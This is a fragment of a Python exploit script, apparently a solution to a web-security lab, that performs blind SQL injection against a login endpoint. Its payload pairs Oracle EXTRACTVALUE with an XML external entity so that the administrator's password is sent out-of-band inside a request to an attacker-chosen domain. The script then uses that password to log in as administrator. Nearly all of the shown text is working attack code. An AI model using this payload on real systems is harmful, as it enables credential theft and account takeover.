...
def oast_re(s, url, path, domain):
    target_url = url + path
    sql_injection = f"""'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{domain}">+%25remote%3b]>'),'/l')+FROM+dual--"""
...
def main():
    ...
    oast_re(s, url, '/login', domain)
    admin_password = input('Type admin password: ')
    login_acc(s, url, 'administrator', admin_password)
